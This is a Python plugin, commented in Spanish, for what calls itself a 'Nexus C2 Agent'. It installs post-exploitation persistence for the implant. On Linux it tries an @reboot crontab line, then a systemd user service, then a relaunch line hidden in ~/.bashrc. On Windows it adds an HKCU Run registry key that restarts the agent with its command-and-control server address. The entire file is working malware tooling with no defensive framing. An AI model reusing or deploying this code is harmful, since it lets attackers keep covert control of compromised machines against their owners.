"""
Plugin !persist — instala persistencia post-explotación.
Linux: crontab @reboot → fallback systemd user service → fallback ~/.bashrc
Windows: clave en HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
"""

import os
import shutil
import subprocess
import sys


def _persist_linux(server_url: str, server_pub: str) -> tuple[int, str, str]:
    env_prefix = f"NEXUS_SERVER={server_url}"
    if server_pub:
        env_prefix += f" NEXUS_SERVER_PUB={server_pub}"

    workdir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
    agent_cmd = f"{sys.executable} -m agent"
    full_cmd = f'cd "{workdir}" && {env_prefix} {agent_cmd}'

    # --- Intento 1: crontab ---
    crontab_bin = shutil.which("crontab") or "/usr/bin/crontab"
    if os.path.isfile(crontab_bin):
        try:
            cron_line = f"@reboot {full_cmd}\n"
            result = subprocess.run(
                [crontab_bin, "-l"], capture_output=True, text=True, timeout=5
            )
            existing = result.stdout if result.returncode == 0 else ""
            if agent_cmd in existing:
                return 0, "Persistencia ya instalada (crontab).", ""
            proc = subprocess.run(
                [crontab_bin, "-"],
                input=existing + cron_line,
                capture_output=True, text=True, timeout=5,
            )
            if proc.returncode == 0:
                return 0, f"Persistencia instalada via crontab:\n  {cron_line.strip()}", ""
        except Exception:
            pass

    # --- Intento 2: systemd user service ---
    systemctl = shutil.which("systemctl")
    if systemctl:
        try:
            service_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(service_dir, exist_ok=True)
            service_path = os.path.join(service_dir, "nexus-agent.service")
            service_content = f"""[Unit]
Description=Nexus C2 Agent
After=network.target

[Service]
Environment={env_prefix}
WorkingDirectory={workdir}
ExecStart={sys.executable} -m agent
Restart=on-failure
RestartSec=10

[Install]
WantedBy=default.target
"""
            with open(service_path, "w") as f:
                f.write(service_content)
            r1 = subprocess.run([systemctl, "--user", "daemon-reload"], capture_output=True, timeout=5)
            r2 = subprocess.run([systemctl, "--user", "enable", "nexus-agent"], capture_output=True, timeout=5)
            if r2.returncode != 0:
                raise RuntimeError(r2.stderr.decode(errors="replace").strip())
            return 0, f"Persistencia instalada via systemd user service:\n  {service_path}", ""
        except Exception as exc:
            pass

    # --- Intento 3: ~/.bashrc ---
    try:
        bashrc = os.path.expanduser("~/.bashrc")
        marker = "# nexus-agent-persist"
        with open(bashrc, "r", errors="replace") as f:
            content = f.read()
        if marker in content:
            return 0, "Persistencia ya instalada (~/.bashrc).", ""
        append = f"\n{marker}\npgrep -f 'python -m agent' > /dev/null 2>&1 || ({full_cmd} &) 2>/dev/null\n"
        with open(bashrc, "a") as f:
            f.write(append)
        return 0, f"Persistencia instalada via ~/.bashrc (se activa en próximo login).", ""
    except Exception as exc:
        return 1, "", f"Todos los métodos fallaron. Último error: {exc}"


def _persist_windows(server_url: str, server_pub: str) -> tuple[int, str, str]:
    import winreg
    workdir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
    cmd = f'cmd /c "cd /d {workdir} && set NEXUS_SERVER={server_url}'
    if server_pub:
        cmd += f' && set NEXUS_SERVER_PUB={server_pub}'
    cmd += f' && {sys.executable} -m agent"'

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "NexusAgent", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        return 0, "Persistencia instalada en HKCU\\...\\Run (se ejecuta al iniciar sesión).", ""
    except Exception as exc:
        return 1, "", f"Error registry: {exc}"


def run(args: str) -> tuple[int, str, str]:
    server_url = os.environ.get("NEXUS_SERVER", "http://127.0.0.1:8080")
    server_pub = os.environ.get("NEXUS_SERVER_PUB", "")

    if sys.platform == "win32":
        return _persist_windows(server_url, server_pub)
    else:
        return _persist_linux(server_url, server_pub)
